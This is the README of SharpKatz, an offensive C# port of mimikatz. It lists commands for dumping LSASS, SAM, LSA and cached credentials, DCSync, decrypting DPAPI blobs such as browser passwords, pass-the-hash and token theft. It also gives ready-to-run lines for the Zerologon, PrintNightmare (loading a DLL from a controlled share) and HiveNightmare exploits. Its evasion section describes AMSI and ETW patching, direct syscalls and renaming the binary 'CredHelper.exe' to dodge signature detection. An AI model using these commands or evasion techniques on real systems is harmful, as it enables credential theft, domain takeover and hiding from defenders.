# SharpKatz
Porting of mimikatz sekurlsa, lsadump and dpapi commands in C# (.NET 4.8)

## Features

| Category | Command | Description |
|----------|---------|-------------|
| **sekurlsa** | `logonpasswords` | Dump credentials from all providers (msv, kerberos, tspkg, credman, wdigest, dpapi) |
| | `msv` | Retrieve credentials from MSV provider |
| | `kerberos` | Retrieve credentials from Kerberos provider |
| | `tspkg` | Retrieve credentials from TsPkg provider |
| | `credman` | Retrieve credentials from Credential Manager |
| | `wdigest` | Retrieve credentials from WDigest provider |
| | `ekeys` | List Kerberos encryption keys |
| | `sekurlsadpapi` | Dump cached DPAPI masterkeys from LSASS memory |
| **lsadump** | `dcsync` | DCSync attack — dump credentials from AD via DRS |
| | `dumpsam` | Dump SAM database from registry hives |
| | `lsasecrets` | Dump LSA secrets from SECURITY hive |
| | `lsacache` | Dump cached domain logons (DCC2/mscash2) |
| | `backupkeys` | Extract DPAPI domain backup keys from DC |
| **dpapi** | `dpapimasterkey` | Decrypt DPAPI masterkey file (password/hash/domain backup key) |
| | `dpapiblob` | Decrypt DPAPI-protected blob using masterkeys |
| **crypto** | `certexport` | Export certificates from local machine store |
| **exploit** | `zerologon` | CVE-2020-1472 — Netlogon privilege escalation |
| | `printnightmare` | CVE-2021-1675 / CVE-2021-34527 — PrintSpooler RCE |
| | `hivenightmare` | CVE-2021-36934 — SAM hive read via shadow copies |
| **misc** | `pth` | Pass-the-Hash — inject NTLM/AES keys into logon session |
| | `token` | Token manipulation (list, steal, make, elevate, revert) |
| | `vault` | Dump Windows Vault credentials |
| | `spawn` | Spawn process with PPID spoofing |
| | `listshadows` | Enumerate shadow copies |

## Usage

### sekurlsa

```
SharpKatz.exe --Command logonpasswords
SharpKatz.exe --Command msv
SharpKatz.exe --Command kerberos
SharpKatz.exe --Command tspkg
SharpKatz.exe --Command credman
SharpKatz.exe --Command wdigest
SharpKatz.exe --Command ekeys
SharpKatz.exe --Command sekurlsadpapi
```

`logonpasswords` runs all providers including sekurlsa::dpapi in a single pass.

### lsadump

```
SharpKatz.exe --Command dumpsam --System <system_hive_path> --Sam <sam_hive_path>
SharpKatz.exe --Command lsasecrets --System <system_hive_path> --Security <security_hive_path>
SharpKatz.exe --Command lsacache --System <system_hive_path> --Security <security_hive_path>
```

**DCSync:**
```
SharpKatz.exe --Command dcsync --User user --Domain userdomain --DomainController dc
SharpKatz.exe --Command dcsync --Guid guid --Domain userdomain --DomainController dc
SharpKatz.exe --Command dcsync --Domain userdomain --DomainController dc
```

With alternative credentials:
```
SharpKatz.exe --Command dcsync --User user --Domain userdomain --DomainController dc --AuthUser authuser --AuthDomain authdomain --AuthPassword authpassword
```

**Backup keys (DPAPI domain backup key extraction from DC):**
```
SharpKatz.exe --Command backupkeys --DC dc.domain.local
SharpKatz.exe --Command backupkeys --DC dc.domain.local --OutputDir C:\keys
```

### dpapi

**Decrypt masterkey file:**
```
SharpKatz.exe --Command dpapimasterkey --MasterkeyFile <path> --Sid <user_SID> --Password <password>
SharpKatz.exe --Command dpapimasterkey --MasterkeyFile <path> --Sid <user_SID> --Hash <SHA1_hash>
SharpKatz.exe --Command dpapimasterkey --MasterkeyFile <path> --PvkFile <domain_backup_key.pvk>
SharpKatz.exe --Command dpapimasterkey --MasterkeyFile <path> --BackupKey <hex_backup_key>
```

**Decrypt DPAPI blob:**
```
SharpKatz.exe --Command dpapiblob --BlobFile <path> --Masterkey <hex_key>
SharpKatz.exe --Command dpapiblob --BlobFile <path> --MkGuid <GUID> --Masterkey <hex_key>
SharpKatz.exe --Command dpapiblob --BlobFile <path> --MkFile <masterkey_cache_file>
```

The masterkey cache file uses `GUID:hex_key` format (one per line). Keys from `sekurlsadpapi` are auto-loaded into the blob cache.

### crypto

```
SharpKatz.exe --Command certexport
SharpKatz.exe --Command certexport --CertExport true --CertDir C:\certs
```

### Pass-the-Hash

```
SharpKatz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash
SharpKatz.exe --Command pth --User username --Domain userdomain --Rc4 rc4key
SharpKatz.exe --Command pth --Luid luid --NtlmHash ntlmhash
SharpKatz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash --Aes256 aes256
```

### Token

```
SharpKatz.exe --Command token --Mode list
SharpKatz.exe --Command token --Mode steal --Pid 1234
SharpKatz.exe --Command token --Mode make --User admin --Domain CORP --Password pass123
SharpKatz.exe --Command token --Mode elevate
SharpKatz.exe --Command token --Mode revert
```

### Vault

```
SharpKatz.exe --Command vault
```

### Spawn (PPID Spoofing)

```
SharpKatz.exe --Command spawn --Binary C:\Windows\System32\cmd.exe
SharpKatz.exe --Command spawn --Binary cmd.exe --ParentPid 1234
SharpKatz.exe --Command spawn --Binary cmd.exe --ParentName svchost
```

### Exploits

**Zerologon (CVE-2020-1472):**
```
SharpKatz.exe --Command zerologon --Mode check --Target dc.domain.local --MachineAccount DC$
SharpKatz.exe --Command zerologon --Mode exploit --Target dc.domain.local --MachineAccount DC$
SharpKatz.exe --Command zerologon --Mode auto --Target dc.domain.local --MachineAccount DC$ --Domain domain.local --User krbtgt --DomainController dc.domain.local
```

**PrintNightmare (CVE-2021-1675 / CVE-2021-34527):**
```
SharpKatz.exe --Command printnightmare --Target dc --Library \\\\mycontrolled\\share\\fun.dll
SharpKatz.exe --Command printnightmare --Target dc --Library \\\\mycontrolled\\share\\fun.dll --AuthUser user --AuthPassword password --AuthDomain dom
```

**HiveNightmare (CVE-2021-36934):**
```
SharpKatz.exe --Command hivenightmare
```

### Shadow Copies

```
SharpKatz.exe --Command listshadows
```

## Evasion Features

- **Direct syscalls** — SSN resolution from clean ntdll on disk, no userland hooks
- **ETW patching** — Disables Event Tracing before sensitive operations
- **AMSI patching** — Bypasses Antimalware Scan Interface
- **Dynamic API resolution** — No static DllImport, all Win32 calls resolved at runtime
- **String obfuscation** — Sensitive strings built char-by-char at runtime
- **PPID spoofing** — Spawn processes under arbitrary parent
- **Costura.Fody** — All dependencies embedded in single assembly
- **Assembly name** — Compiled as `CredHelper.exe` to avoid signature detection

## DPAPI Attack Chain

A typical DPAPI credential extraction workflow:

1. **`sekurlsadpapi`** — Dump cached masterkeys from LSASS (keys auto-cached)
2. **`backupkeys`** — Extract domain backup key from DC (alternative: if you have DC access)
3. **`dpapimasterkey`** — Decrypt user masterkey files using password, hash, or backup key
4. **`dpapiblob`** — Decrypt DPAPI blobs (Chrome passwords, saved credentials, etc.) using decrypted masterkeys

## Build

- Target: .NET Framework 4.8 (x64)
- Restore NuGet packages before building (Costura.Fody, Fody, NDesk.Options):
  ```
  nuget restore SharpKatz.sln
  ```
  Or in Visual Studio: right-click Solution → **Restore NuGet Packages**
- Open `SharpKatz.sln` in Visual Studio and build Release|x64
- Output: `bin\x64\Release\CredHelper.exe`

> **Note:** If you get "referenced component could not be found" warnings, NuGet packages have not been restored. The project will not compile without Costura.Fody (assembly merging) and NDesk.Options (command-line parsing).

## Credits

This project depends entirely on the work of [Benjamin Delpy](https://twitter.com/gentilkiwi) and [Vincent Le Toux](https://twitter.com/mysmartlogon) on [Mimikatz](https://github.com/gentilkiwi/mimikatz) and [MakeMeEnterpriseAdmin](https://raw.githubusercontent.com/vletoux/MakeMeEnterpriseAdmin/master/MakeMeEnterpriseAdmin.ps1) projects.<br>
The analysis of the code was conducted following the example from [this blog post](https://blog.xpnsec.com/exploring-mimikatz-part-1/) by [xpn](https://twitter.com/_xpn_).
